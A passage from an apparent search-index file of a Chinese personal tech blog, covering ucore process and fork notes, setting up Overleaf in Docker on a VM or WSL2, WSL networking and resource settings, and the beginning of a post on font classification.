eflag\uff0c\u5176\u5b83\u5982\u901a\u7528\u5bc4\u5b58\u5668\u5219\u7531\u8f6f\u4ef6\u5b8c\u6210\uff09\u3002\u800c\u4e4b\u540e\u5728\u5185\u6838\u6001\u8fdb\u884c\u7684\u4e00\u7cfb\u5217\u51fd\u6570\u8c03\u7528\u4e5f\u662f\u4f7f\u7528\u8be5\u8fdb\u7a0b\u7684\u5185\u6838\u6808\u3002\u5728\u6267\u884cschedule\u540e\uff0c\u901a\u8fc7\u8f6f\u4ef6\u5c06\u8be5\u8fdb\u7a0b\u7684\u201c\u5185\u6838\u6001\u4e0a\u4e0b\u6587\u201d\u5b58\u5165\u8be5\u8fdb\u7a0b\u6570\u636e\u7ed3\u6784\u7684context\u53d8\u91cf\u4e2d\uff08eip\u4e3aswitch_to()\u8c03\u7528\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\uff09\u3002\u56e0\u6b64\u518d\u6b21\u5207\u6362\u56de\u6765\u65f6\uff0c\u4ecd\u5904\u4e8e\u5185\u6838\u6001\uff0c\u5e76\u4eceswitch_to()\u4e0b\u4e00\u6761\u7ee7\u7eed\u6267\u884c\uff0c\u7ecf\u8fc7\u4e00\u7cfb\u5217\u51fd\u6570\u8fd4\u56de\uff0c\u6700\u7ec8\u56de\u5230trap_ret\uff0c\u4ece\u8fdb\u7a0b\u7684\u4e2d\u65ad\u5e27\u8fd4\u56de\u5230\u7528\u6237\u6001\uff0c\u4e5f\u5c31\u662f\u8be5\u8fdb\u7a0b\u65f6\u949f\u4e2d\u65ad\u4e4b\u524d\u7684\u72b6\u6001\u3002</p> <ol> <li>\u4e00\u4e2a\u8fdb\u7a0b\u7684\u5b8c\u6574\u751f\u547d\u5468\u671f\uff1f</li> </ol> <pre><code>// process's state in his life cycle\nenum proc_state {\n    PROC_UNINIT = 0,  // uninitialized\n    PROC_SLEEPING,    // sleeping\n    PROC_RUNNABLE,    // runnable(maybe running)\n    PROC_ZOMBIE,      // almost dead, and wait parent proc to reclaim his resource\n};\n</code></pre> <p></p> <ol> <li>fork\u8c03\u7528\uff0c\u4e3a\u4ec0\u4e48\u7236\u8fdb\u7a0b\u8fd4\u56de\u503c\u4e3apid\uff0c\u5b50\u8fdb\u7a0b\u8fd4\u56de\u503c\u4e3a0\uff08\u6d89\u53ca\u5230\u7528\u6237\u8fdb\u7a0b\u7684\u521b\u5efa\uff09</li> </ol> <pre><code>cprintf(\"I am the parent. Forking the child...\\n\");\nif ((pid = fork()) == 0) {\n cprintf(\"I am the child.\\n\");\n}\n</code></pre> <p>\u7b54\uff1a</p> <p>\u7236\u8fdb\u7a0b\u6267\u884c\u8def\u7ebf\uff1a</p> <ol> <li> <p>fork() -&gt; /user/libs/syscall::sys_fork() </p> <p>int SYS_fork\u5f15\u8d77\u4e2d\u65ad\uff0c\u4fdd\u5b58\u4e2d\u65ad\u5e27\uff08\u7236\u8fdb\u7a0b\u7684\u5185\u6838\u6808\u4e2d\uff09</p> </li> <li> <p>__all_traps -&gt; trap -&gt; trap_dispatch -&gt; syscall -&gt; do_fork</p> <p>\u200b do fork\u53c2\u6570\u4e3a\u7236\u8fdb\u7a0b\u7684\u4e2d\u65ad\u5e27 </p> </li> <li> <p>\u4ecedo_fork\u8fd4\u56de\u5230syscall</p> <p>syscall\u4e2d\u4ee3\u7801\uff1a</p> <pre><code>tf-&gt;tf_regs.reg_eax = syscalls[num](arg);\n</code></pre> <p>\u5c06\u7236\u8fdb\u7a0b\u7684\u4e2d\u65ad\u5e27\u7684eax\u4fee\u6539\u4e3ado_fork\u8fd4\u56de\u7684pid</p> </li> <li> <p>\u8fd4\u56de\u5230__all_traps -&gt; trapret</p> <p>\u4ece\u4e2d\u65ad\u5e27\u8fd4\u56de\uff0c\u7ee7\u7eed\u6267\u884cfork()\u540e\u4ee3\u7801</p> </li> </ol> <p>\u5b50\u8fdb\u7a0b\u6267\u884c\u8def\u7ebf\uff1a</p> <ol> <li> <p>schedule -&gt; proc_run - &gt; switch_to -&gt; fork_ret</p> <p>\u4ece\u4e2d\u65ad\u5e27\u8fd4\u56de\uff0c\u6267\u884cfork()\u540e\u7684\u4ee3\u7801</p> </li> </ol> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u7236\u8fdb\u7a0b\u66f4\u6539\u4e86eax\uff0c\u6545\u8fd4\u56de\u503c\u53d8\u4e3apid\uff0c\u5b50\u8fdb\u7a0b\u5219\u4e3a\u539f\u59cb\u7684eax\uff08\u8fd9\u91cc\u6211\u8fd8\u4e0d\u592a\u6e05\u695a\u4e3a\u4ec0\u4e48\u4e00\u5b9a\u4e3a0\uff09</p>","tags":["ucore"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-10-%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A%E6%90%AD%E5%BB%BAoverleaf/","title":"\u5728\u865a\u62df\u673a\u4e0a\u642d\u5efaoverleaf","text":"<ul> <li>\u6982\u8ff0</li> <li>docker\u5b89\u88c5</li> <li>overleaf\u5b89\u88c5</li> <li>overleaf\u5b89\u88c5package</li> <li>\u4f7f\u7528wsl2\u642d\u5efa<ul> <li>\u5b89\u88c5wsl2</li> <li>\u5b89\u88c5Docker Desktop<ul> <li>\u914d\u7f6e\u6e90</li> </ul> </li> <li>\u5b89\u88c5overleaf</li> </ul> </li> <li>\u53c2\u8003</li> </ul>","tags":["overleaf"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-10-%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A%E6%90%AD%E5%BB%BAoverleaf/#\u6982\u8ff0","title":"\u6982\u8ff0","text":"<p>\u56e0\u4e3a\u5b66\u6821\u7684overleaf\u65e0\u6cd5\u901a\u8fc7latex\u4ee3\u7801\u5b9a\u4f4d\u5230pdf\u4f4d\u7f6e\u3002\u56e0\u6b64\u60f3\u5728\u672c\u5730\u642d\u5efa\u4e00\u4e2alatex\u73af\u5883\uff0c\u800c\u5982\u679c\u5728windows\u91cc\u5b89\u88c5texlive+\u914d\u7f6eVS code\u6bd4\u8f83\u9ebb\u70e6\uff0c\u4e14\u4ee5\u540e\u91cd\u88c5\u7cfb\u7edf\u53c8\u65e0\u6cd5\u4fdd\u7559\uff0c\u56e0\u6b64\u8003\u8651\u5728ubuntu\u865a\u62df\u673a\u91cc\u5b89\u88c5\u3002</p> <p>\u8fd9\u91cc\u8003\u8651\u540c\u6837\u642d\u5efa\u4e00\u4e2aoverleaf\uff0c\u6bd5\u7adf\u5728\u4e3b\u673a\u91cc\u6253\u5f00\u6d4f\u89c8\u5668\u76f4\u63a5\u5c31\u80fd\u7528\u5c31\u5f88\u65b9\u4fbf\uff0c\u4e14\u754c\u9762\u4e5f\u66f4\u7f8e\u89c2\u3002</p> <p>overleaf\u91c7\u7528\u4e86docker\u8fdb\u884c\u90e8\u7f72\uff0c\u56e0\u6b64\u9700\u8981\u5148\u5b89\u88c5docker\u3002</p> <p>\u66f4\u65b0</p> <p>\u5728virtualbox\u865a\u62df\u673a\u642d\u5efa\u540e\u53d1\u73b0\u5b58\u5728\u6027\u80fd\u95ee\u9898\u3002\u4ee5\u7f16\u8bd1\u8ba1\u7ec4\u6307\u5bfc\u4e66\u4e3a\u4f8b\uff0c\u6bcf\u6b21\u4fee\u6539\u7f16\u8bd1\u9700\u89811\u5206\u949f\uff0c\u5e76\u4e14\u7ecf\u5e38\u51fa\u73b0\u7f16\u8bd12-3\u5206\u949f\u7136\u540e\u5931\u8d25\u7684\u60c5\u51b5\u3002</p> <p>\u5728\u67e5\u9605wsl\u6027\u80fd\u6bd4\u8f83\u540e\uff0c\u53d1\u73b0wsl2\u7684\u6027\u80fd\u5df2\u7ecf\u6bd4\u8f83\u597d\u4e86\uff0c\u6709\u4e9b\u573a\u5408\u63a5\u8fd1\u539f\u751flinux\u7684\u6027\u80fd\u3002\u53c2\u8003Windows 10 May 2020 Performance For WSL vs. WSL2</p> <p>\u4e8e\u662f\u8865\u5145\u4e86\u5728wsl2\u4e0a\u642d\u5efa\u7684\u5185\u5bb9\u3002</p>","tags":["overleaf"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-10-%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A%E6%90%AD%E5%BB%BAoverleaf/#docker\u5b89\u88c5","title":"docker\u5b89\u88c5","text":"<ol> <li>\u5b89\u88c5docker</li> </ol> <p>\u4f7f\u7528sh\u811a\u672c\u4e00\u952e\u5b89\u88c5\uff0c\u53c2\u8003DaoCloud</p> <p>\u975eroot\u7528\u6237\u8fd8\u9700\u8981\u6dfb\u52a0\u5230docker\u7ec4</p> <pre><code>  ```bash\n</code></pre> <p>sudo usermod -aG docker your-user       ```</p> <ol> <li>\u5b89\u88c5docker compose</li> </ol> <p>\u4f7f\u7528sh\u811a\u672c\u4e00\u952e\u5b89\u88c5\uff0c\u53c2\u8003DaoCloud</p> <ol> <li>docker\u955c\u50cf\u52a0\u901f</li> </ol> <pre><code>sudo mkdir -p /etc/docker\nsudo tee /etc/docker/daemon.json &lt;&lt;-'EOF'\n{\n  \"registry-mirrors\": [\"https://&lt;your-key&gt;.mirror.aliyuncs.com\"]\n}\nEOF\nsudo systemctl daemon-reload\nsudo systemctl restart docker\n</code></pre> <p>\u53c2\u8003\u963f\u91cc\u4e91\u5bb9\u5668\u955c\u50cf\u670d\u52a1</p>","tags":["overleaf"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-10-%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A%E6%90%AD%E5%BB%BAoverleaf/#overleaf\u5b89\u88c5","title":"overleaf\u5b89\u88c5","text":"<p>\u53c2\u8003overleaf:toolkit\uff0c\u4e3b\u8981\u662f\u4f7f\u7528\u4e86docker compose\u81ea\u52a8\u5b89\u88c5\u7ba1\u7406\u591a\u4e2a\u5bb9\u5668\u3002</p>","tags":["overleaf"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-10-%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A%E6%90%AD%E5%BB%BAoverleaf/#overleaf\u5b89\u88c5package","title":"overleaf\u5b89\u88c5package","text":"<p>\u521a\u5b89\u88c5\u597d\u7684overleaf\u7f3a\u5c11\u4e86ctex\u7b49\u5f88\u591a\u5305\uff0c\u76f4\u63a5\u7f16\u8bd1\u8ba1\u7ec4\u6307\u5bfc\u4e66\u4f1a\u63d0\u793a\u7f3a\u5c11**.sty\u6587\u4ef6\uff0c\u6240\u4ee5\u9700\u8981\u624b\u52a8\u5b89\u88c5\u5305\u3002</p> <p>overleaf\u5e95\u5c42\u7684tex\u7f16\u8bd1\u5668\u91c7\u7528\u7684\u662ftexlive\u53d1\u884c\u7248\uff0c\u91c7\u7528tlmgr\u7ba1\u7406\u5305\u3002</p> <ol> <li>\u67e5\u770bdocker\u5bb9\u5668</li> </ol> <pre><code>\u279c  ~ sudo docker ps \nCONTAINER ID        IMAGE                         COMMAND                  CREATED             STATUS                    PORTS                NAMES\n046949b8197a        sharelatex/sharelatex:2.4.1   \"/sbin/my_init\"          21 hours ago        Up 12 minutes             0.0.0.0:80-&gt;80/tcp   sharelatex\n0076877c7906        mongo:3.6                     \"docker-entrypoint.s\u2026\"   21 hours ago        Up 12 minutes (healthy)   27017/tcp            mongo\n755cc370c29b        redis:5.0                     \"docker-entrypoint.s\u2026\"   21 hours ago        Up 12 minutes             6379/tcp             redis\n</code></pre> <p>\u5176\u4e2dsharelatex\u4e3aoverleaf\u5e94\u7528\uff0c\u53e6\u5916\u4e24\u4e2a\u4e3a\u6570\u636e\u5e93\u3002</p> <ol> <li>\u8fdb\u5165sharelatex\u5bb9\u5668</li> </ol> <pre><code>\u279c  ~ sudo docker exec -it 0469 /bin/bash\nroot@046949b8197a:/# \n</code></pre> <ol> <li>\u4f7f\u7528tlmgr\u8f6f\u4ef6</li> </ol> <p>\u53ef\u4ee5\u901a\u8fc7<code>tlmgr install &lt;package&gt;</code>\u6765\u5b89\u88c5\u5404\u79cd\u5305\uff0c\u4f46\u662f\u6548\u7387\u592a\u4f4e\uff08\u9700\u8981\u5b89\u88c5\u51e0\u5341\u4e2a\u5305\uff09\uff0c\u56e0\u6b64\u91c7\u7528\u4e00\u4e2a\u7279\u6b8a\u7684\u5305<code>texliveonfly</code>\u6765\u81ea\u52a8\u5b89\u88c5\u9700\u8981\u7684\u5305\u3002\u53c2\u8003[1]</p> <pre><code>#\u66f4\u6362CTAN\u6e90\u4e3a\u6e05\u534e\u6e90, \u5e2e\u52a9: https://mirrors.tuna.tsinghua.edu.cn/help/CTAN/\ntlmgr option repository https://mirrors.tuna.tsinghua.edu.cn/CTAN/systems/texlive/tlnet\n\ntlmgr update --self\ntlmgr install texliveonfly\n</code></pre> <ol> <li>\u4f7f\u7528texliveonfly\u81ea\u52a8\u5b89\u88c5\u5305</li> </ol> <pre><code>#\u627e\u5230overleaf\u4e2d\u9700\u8981\u7f16\u8bd1\u7684tex\u6587\u4ef6\nroot@046949b8197a:/# find /var -name elegantbook-cn.tex\n/var/lib/sharelatex/data/compiles/5f805cb6723b610077ad52ad-5f805b95723b610077ad52a4/elegantbook-cn.tex\n/var/lib/sharelatex/data/compiles/5f817d1ba9660e0077353294-5f805b95723b610077ad52a4/elegantbook-cn.tex\n\n# \u5207\u6362\u5230\u8be5\u76ee\u5f55\u540e\ntexliveonfly elegantbook-cn.tex #\u9ed8\u8ba4\u4f7f\u7528pdflatex\n... #\u7701\u7565\u8f93\u51fa\ntexliveonfly elegantbook-cn.tex -c xelatex #\u6307\u5b9a\u4f7f\u7528xelatex\u7f16\u8bd1\u5668\n</code></pre>","tags":["overleaf"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-10-%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A%E6%90%AD%E5%BB%BAoverleaf/#\u4f7f\u7528wsl2\u642d\u5efa","title":"\u4f7f\u7528wsl2\u642d\u5efa","text":"","tags":["overleaf"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-10-%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A%E6%90%AD%E5%BB%BAoverleaf/#\u5b89\u88c5wsl2","title":"\u5b89\u88c5wsl2","text":"<p>\u53c2\u8003[2]</p>","tags":["overleaf"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-10-%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A%E6%90%AD%E5%BB%BAoverleaf/#\u5b89\u88c5docker-desktop","title":"\u5b89\u88c5Docker Desktop","text":"<p>\u53c2\u8003[3]</p>","tags":["overleaf"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-10-%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A%E6%90%AD%E5%BB%BAoverleaf/#\u914d\u7f6e\u6e90","title":"\u914d\u7f6e\u6e90","text":"<p>setting-&gt;docker engine\uff0c\u540c\u6837\u662f\u7f16\u8f91daemon.json\uff0c\u5728registry-mirrors\u4e2d\u6dfb\u52a0\u955c\u50cf\u6e90</p>","tags":["overleaf"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-10-%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A%E6%90%AD%E5%BB%BAoverleaf/#\u5b89\u88c5overleaf","title":"\u5b89\u88c5overleaf","text":"<p>\u8fc7\u7a0b\u540c\u4e0a\uff0c\u53ea\u662f\u5728wsl\u4e2d\u64cd\u4f5c</p>","tags":["overleaf"]},{"location":"%E6%8A%98%E8%85%BE/2020/10/11/2020-10-10-%E5%9C%A8%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A%E6%90%AD%E5%BB%BAoverleaf/#\u53c2\u8003","title":"\u53c2\u8003","text":"<ol> <li>Auto Package download for TeXLive</li> <li>microsoft doc: wsl install</li> <li>docker doc: windows install docker</li> </ol>","tags":["overleaf"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/10/11/2020-10-11-WSL%E8%AE%B0%E5%BD%95/","title":"WSL\u8bb0\u5f55","text":"","tags":["wsl"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/10/11/2020-10-11-WSL%E8%AE%B0%E5%BD%95/#\u6982\u8ff0","title":"\u6982\u8ff0","text":"<p>\u53d1\u73b0\u4f7f\u7528wsl + docker + vs code(remote wsl + remote container\u63d2\u4ef6)\u53ef\u4ee5\u8ba9\u5f00\u53d1\u3001\u90e8\u7f72\u3001\u8fd0\u884c\u6574\u4e2a\u6d41\u7a0b\u53d8\u5f97\u66f4\u52a0\u65b9\u4fbf\u3002\u56e0\u6b64\u60f3\u5199\u4e00\u7bc7\u6587\u7ae0\u8bb0\u5f55\u63a5\u89e6wsl\u540e\u4e86\u89e3\u5230\u7684\u4e00\u4e9b\u77e5\u8bc6\u4ee5\u53ca\u9047\u5230\u7684\u4e00\u4e9b\u95ee\u9898\u4ee5\u53ca\u89e3\u51b3\u65b9\u6848\uff08\u957f\u671f\u66f4\u65b0\uff09\u3002</p>","tags":["wsl"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/10/11/2020-10-11-WSL%E8%AE%B0%E5%BD%95/#wsl1\u539f\u7406","title":"WSL1\u539f\u7406","text":"<p>\u5fae\u8f6f\u5b98\u65b9wsl\u535a\u5ba2\u4e2d\u6709\u4e00\u4e2a\u7cfb\u5217\u6587\u7ae0\u4ecb\u7ecdwsl1\u7684\u539f\u7406\uff0c\u5728\u9605\u8bfb\u5176\u4e2d\u5173\u4e8e\u7cfb\u7edf\u8c03\u7528\u5185\u5bb9\u540e\u53d1\u73b0\u6ca1\u6709\u60f3\u8c61\u4e2d\u7684\u96be\u61c2\uff0c\u53cd\u800c\u5b66\u5230\u4e86\u8bb8\u591a\u77e5\u8bc6\uff0c\u56e0\u6b64\u628a\u5b83\u8bb0\u5f55\u4e0b\u6765\u3002</p> <p>\u7cfb\u5217\u535a\u5ba2</p> <ol> <li>Windows Subsystem for Linux Overview</li> <li>Pico Process Overview</li> <li>WSL system Calls</li> <li>WSL File System Support</li> <li>\u5176\u5b83</li> </ol>","tags":["wsl"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/10/11/2020-10-11-WSL%E8%AE%B0%E5%BD%95/#\u8bbe\u7f6ewsl\u5185\u5b58\u4e0ecpu\u8d44\u6e90","title":"\u8bbe\u7f6ewsl\u5185\u5b58\u4e0ecpu\u8d44\u6e90","text":"<p>\u7f16\u8f91<code>C:\\Users\\&lt;yourUserName&gt;\\.wslconfig</code>\u5185\u5bb9</p> <pre><code>[wsl2]\nkernel=C:\\\\temp\\\\myCustomKernel\nmemory=4GB # Limits VM memory in WSL 2 to 4 GB\nprocessors=2 # Makes the WSL 2 VM use two virtual processors\n</code></pre> <p>\u5176\u5b83\u8d44\u6e90\u8bbe\u7f6e\u53c2\u8003[1]</p>","tags":["wsl"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/10/11/2020-10-11-WSL%E8%AE%B0%E5%BD%95/#\u8bbf\u95ee\u7f51\u7edc\u5e94\u7528\u7a0b\u5e8f","title":"\u8bbf\u95ee\u7f51\u7edc\u5e94\u7528\u7a0b\u5e8f","text":"","tags":["wsl"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/10/11/2020-10-11-WSL%E8%AE%B0%E5%BD%95/#\u4ece-windows-localhost-\u8bbf\u95ee-linux-\u7f51\u7edc\u5e94\u7528","title":"\u4ece Windows (localhost) \u8bbf\u95ee Linux \u7f51\u7edc\u5e94\u7528","text":"<p>\u76f4\u63a5\u901a\u8fc7localhost\u8bbf\u95ee\uff08\u6ce8\u610f\uff0c\u901a\u8fc7127.0.0.1\u8bbf\u95ee\u4f1a\u5931\u8d25\uff09</p> <p>\u5982\u679c\u8fd0\u884c\u7684\u662f\u8f83\u65e7\u7248\u672c\u7684 Windows\uff08\u7248\u672c 18945 \u6216\u66f4\u4f4e\u7248\u672c\uff09\uff0c\u5219\u9700\u8981\u83b7\u53d6 Linux \u4e3b\u673a VM \u7684 IP \u5730\u5740 </p>","tags":["wsl"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/10/11/2020-10-11-WSL%E8%AE%B0%E5%BD%95/#\u4ece-linux\u4e3b\u673a-ip\u8bbf\u95ee-windows-\u7f51\u7edc\u5e94\u7528","title":"\u4ece Linux\uff08\u4e3b\u673a IP\uff09\u8bbf\u95ee Windows \u7f51\u7edc\u5e94\u7528","text":"<p>\u5982\u8bbe\u7f6egit\u4f7f\u7528windows\u7684socks\u4ee3\u7406\u3002</p> <pre><code>\u279c  ~ cat /etc/resolv.conf\n# This file was automatically generated by WSL. To stop automatic generation of this file, add the following entry to /etc/wsl.conf:\n# [network]\n# generateResolvConf = false\nnameserver 172.31.144.1\n</code></pre> <p>\u4f7f\u7528\u8be5ip\u8bbf\u95eewindows\u7f51\u7edc\u5e94\u7528\uff08\u6ce8\u610f\uff0c\u6bcf\u6b21\u542f\u52a8wsl\u8be5ip\u4f1a\u53d8\u5316\uff0c\u76ee\u524d\u8fd8\u6ca1\u627e\u5230\u89e3\u51b3\u65b9\u5f0f\uff09</p>","tags":["wsl"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/10/11/2020-10-11-WSL%E8%AE%B0%E5%BD%95/#\u4ece\u5c40\u57df\u7f51-lan-\u8bbf\u95ee-wsl-2-\u5206\u53d1\u7248","title":"\u4ece\u5c40\u57df\u7f51 (LAN) \u8bbf\u95ee WSL 2 \u5206\u53d1\u7248","text":"<p>\u4f7f\u7528wsl1\u65f6\uff0cwsl\u4e0e\u4e3b\u673a\u5171\u7528ip\uff0c\u56e0\u6b64\u5982\u679c\u8ba1\u7b97\u673a\u8bbe\u7f6e\u4e3a\u53ef\u4f9b LAN \u8bbf\u95ee\uff0c\u90a3\u4e48\u5728 WSL \u4e2d\u8fd0\u884c\u7684\u5e94\u7528\u7a0b\u5e8f\u4e5f\u53ef\u4f9b\u5728 LAN \u4e2d\u8bbf\u95ee\u3002 </p> <p>\u4f7f\u7528wsl2\u65f6\uff0cwsl\u6709\u4e00\u4e2a\u5e26\u6709\u5176\u81ea\u5df1\u72ec\u4e00\u65e0\u4e8c\u7684 IP \u5730\u5740\u7684\u865a\u62df\u4ee5\u592a\u7f51\u9002\u914d\u5668\uff08\u548c\u4e3b\u673a\u6240\u5728\u7684\u7f51\u6bb5\u4e0d\u4e00\u6837\uff0c\u5982\uff1a\u4e3b\u673a\u8fde\u63a5\u7684\u8def\u7531\u5668\u7684\u7f51\u6bb5\u4e3a192.168.1.0/24\uff0c\u800cwsl\u6240\u5728\u7684\u7f51\u6bb5\u4e3a172.31.144.0/20\uff0cwsl\u4e0a\u7f51\u9700\u8981\u7ecf\u8fc7\u4e3b\u673a\u8fdb\u884cNAT\u8f6c\u6362\uff09\uff0c\u56e0\u6b64\u9700\u8981\u6267\u884c\u4e0e\u5e38\u89c4\u865a\u62df\u673a\u76f8\u540c\u7684\u6b65\u9aa4\uff08\u7aef\u53e3\u8f6c\u53d1\uff09\u3002</p> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u793a\u4f8b PowerShell \u547d\u4ee4\uff0c\u7528\u4e8e\u6dfb\u52a0\u4fa6\u542c\u4e3b\u673a\u4e0a\u7684\u7aef\u53e3 4000 \u7684\u7aef\u53e3\u4ee3\u7406\u5e76\u5c06\u5176\u8fde\u63a5\u5230\u7aef\u53e3 4000\uff0c\u5e76\u4f7f\u7528 IP \u5730\u5740172.31.157.77\uff08WSL\u7684ip\u5730\u5740\uff09\u8fde\u63a5\u5230 WSL 2 VM\u3002 </p> <pre><code>netsh interface portproxy add v4tov4 listenport=4000 listenaddress=0.0.0.0 connectport=4000 connectaddress=172.31.157.77\n</code></pre> <p>\u5176\u5b83\u53c2\u8003[2]</p>","tags":["wsl"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/10/11/2020-10-11-WSL%E8%AE%B0%E5%BD%95/#\u53c2\u8003","title":"\u53c2\u8003","text":"<ol> <li> <p>microsoft doc: wsl-config</p> </li> <li> <p>microsoft doc: wsl1/2 compare</p> </li> </ol>","tags":["wsl"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/10/11/2020-10-11-%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/","title":"\u5b57\u4f53\u5206\u7c7b","text":"<ul> <li>\u6982\u8ff0<ul> <li>font family</li> <li>font style</li> <li>font weight</li> <li>font size</li> </ul> </li> <li>css\u4e2d\u8bbe\u7f6e\u5b57\u4f53<ul> <li>font-*\u5c5e\u6027</li> <li>font\u5c5e\u6027</li> </ul> </li> <li>LaTex\u4e2d\u8bbe\u7f6e\u5b57\u4f53<ul> <li>Font size, style, family</li> <li>Underlined, emphasising</li> <li>Supporting modern fonts with XeLaTeX</li> </ul> </li> <li>\u53c2\u8003\u6587\u732e</li> </ul>","tags":["\u5b57\u4f53"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/10/11/2020-10-11-%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/#\u6982\u8ff0","title":"\u6982\u8ff0","text":"<p>\u76ee\u524d\u8fd8\u6ca1\u6709\u4e00\u79cd\u7edf\u4e00\u7684\u5b57\u4f53\u5206\u7c7b\u65b9\u6cd5\u3002\u56e0\u6b64\u672c\u6587\u4ece\u6613\u4e8e\u7406\u89e3\u7684\u89d2\u5ea6\uff0c\u4f7f\u75284\u4e2a\u7ef4\u5ea6\u5bf9\u5b57\u4f53\u8fdb\u884c\u5206\u7c7b\u3002</p> <p>\u7b80\u5355\u6765\u8bf4\uff0c\u786e\u5b9a\u4e86\u5927\u5c0f\u3001\u7c97\u7ec6\u3001\u6837\u5f0f\u548c\u5b57\u4f53\u7cfb\u5217\u540e\u4fbf\u786e\u5b9a\u4e86\u4e00\u79cd\u5b57\u4f53\u3002</p>","tags":["\u5b57\u4f53"]},{"location":"%E5%AD%A6%E4%B9%A0/2020/10/11/2020-10-11-%E5%AD%97%E4%BD%93%E5%88%86%E7%B1%BB/#font-family","title":"font family","text":"<p>\u5b57\u4f53\u7cfb\u5217(font family)\u8868\u793a\u7b26\u5408\u540c\u4e00\u79cd\u8bbe\u8ba1\u98ce\u683c\u7684\u5b57\u4f53\u7684\u96c6\u5408\u3002\u6bd4\u5982\u5927\u540d\u9f0e\u9f0e\u7684Helvetica\u5b57\u4f53\u5c31\u56e0\u9192\u76ee\uff0c\u6e05\u6670\u800c\u5e7f\u6cdb\u5e94\u7528\u4e8e\u5e7f\u544a\uff0c\u5ba3\u4f20\u8bed\u7b49\u573a\u5408\u3002Time New Roman\u4e5f\u662f\u4e00\u79cd\u4f7f\u7528\u975e\u5e38\u5e7f\u6cdb\u7684\u5b57\u4f53\u3002</p> <p>\u4e00\u79cd\u5b57\u4f53\u7cfb\u5217\u5305\u542b\u591a\u79cd\u53d8\u4f53\u5b57\u4f53\uff0c\u5982Times\u5305\u542bTimeIt(\u503e\u659c), TimeBd(\u52a0\u7c97)\u7b49\u3002\u6211\u4eec\u53e3\u8bed\u4e2d\u8bf4\u7684\u67d0\u4e00\u79cd\u5b57\u4f53\uff0c\u5176\u5b9e\u901a\u5e38\u8bf4\u7684\u662f\u4e00\u79cd\u5b57\u4f53\u7cfb\u5217\u3002</p> <p>\u800c\u5bf9\u4e8e\u73b0\u6709\u7684\u4e94\u82b1\u516b\u95e8\u7684\u5b57\u4f53\u7cfb\u5217\uff0c\u53ef\u4ee5\u6839\u636e\u4e00\u4e9b\u7279\u70b9\u5206\u62105\u7c7b\uff0c\u4e5f\u53eb\u901a\u7528\u5b57\u4f53\u7cfb\u5217(generic font families)\u3002\u5982Helvetica\u5c31\u5c5e\u4e8e\u65e0\u886c\u7ebf(sans serif)\u5b57\u4f53\u3002</p> <p>\u4ee5\u4e0b\u662f\u5b57\u4f53\u7cfb\u5217\u76845\u79cd\u7c7b\u522b</p> <ul> <li>Serif \u5b57\u4f53: \u6709\u886c\u7ebf\uff0c \u610f\u601d\u662f\u5728\u5b57\u7684\u7b14\u753b\u5f00\u59cb\u3001\u7ed3\u675f\u7684\u5730\u65b9\u6709\u989d\u5916\u7684\u88c5\u9970\uff0c\u800c\u4e14\u7b14\u753b\u7684\u7c97\u7ec6\u4f1a\u6709\u6240\u4e0d\u540c\u3002 \u7c7b\u4f3c\u4e8e\u4e2d\u6587\u4e2d\u7684\u987f\u7b14\u3002 Serif \u5b57\u4f53\u7684\u4f8b\u5b50\u5305\u62ec Times\u3001Georgia\u3001Sung or Song(\u5b8b\u4f53)\u3002</li> </ul> <p>Glyphs of serif fonts, as the term is used in CSS, tend to have finishing strokes, flared or tapering ends, or have actual serifed endings (including slab serifs). Serif fonts are typically proportionately-spaced. They often display a greater variation between thick and thin strokes than fonts from the 'sans-serif' generic font family.  </p> <ul> <li>Sans-serif \u5b57\u4f53: \u65e0\u886c\u7ebf\uff0c\u4e0eserif\u76f8\u53cd\uff0c\u6ca1\u6709\u989d\u5916\u7684\u88c5\u9970\uff0c\u800c\u4e14\u7b14\u753b\u7684\u7c97\u7ec6\u5dee\u4e0d\u591a\u3002 Sans-serif \u5b57\u4f53\u7684\u4f8b\u5b50\u5305\u62ec Helvetica\u3001Arial\u3001\u9ed1\u4f53\u3002</li> </ul> <p>Glyphs in sans-serif fonts, as the term is used in CSS, tend to have stroke endings that are plain -- with little or no flaring, cross stroke, or other ornamentation. Sans-serif fonts are typically proportionately-spaced.  </p> <ul> <li> <p>Monospace \u5b57\u4f53: 